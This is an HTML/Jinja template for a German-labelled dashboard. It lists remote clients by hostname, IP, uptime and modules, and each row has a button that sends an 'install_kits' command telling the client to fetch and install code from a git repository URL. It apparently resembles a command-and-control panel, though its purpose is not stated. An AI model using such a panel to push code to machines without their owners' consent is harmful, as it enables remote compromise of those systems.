<!DOCTYPE html>
<html>
<head>
  <title>aet-dashboard</title>
  <style>
    body { font-family: sans-serif; background: #111; color: #eee; padding: 2em; }
    table { width: 100%; border-collapse: collapse; }
    th, td { border-bottom: 1px solid #444; padding: 8px; text-align: left; vertical-align: top; }
    th { background-color: #222; }
    tr:hover { background-color: #333; }

    input[type="text"] {
      background: #222;
      color: #eee;
      border: 1px solid #444;
      padding: 4px;
    }
    button {
      background: #444;
      color: #eee;
      border: none;
      padding: 6px 12px;
      cursor: pointer;
    }
    button:hover {
      background: #666;
    }
  </style>
</head>
<body>
  <h1>-@_Dashboard</h1>
  <table>
    <tr>
      <th>Client ID</th>
      <th>Hostname</th>
      <th>IP</th>
      <th>Uptime</th>
      <th>Modules</th>
      <th>Last Seen</th>
      <th>Aktionen</th> <!-- NEU -->
    </tr>
    {% for c in clients %}
    <tr>
      <td>{{ c.client_id }}</td>
      <td>{{ c.hostname }}</td>
      <td>{{ c.ip }}</td>
      <td>{{ c.uptime }}</td>
      <td><pre>{{ c.modules }}</pre></td>
      <td>{{ c.last_seen }}</td>
      <td>
        <form method="post" action="/api/command">
          <input type="hidden" name="client_id" value="{{ c.client_id }}">
          <input type="hidden" name="cmd" value="install_kits">
          <input type="text" name="args" value="https://github.com/deinuser/kITs.git" size="35">
          <button type="submit">ðŸš€ Installiere kITs</button>
        </form>
      </td>
    </tr>
    {% endfor %}
  </table>
</body>
</html>
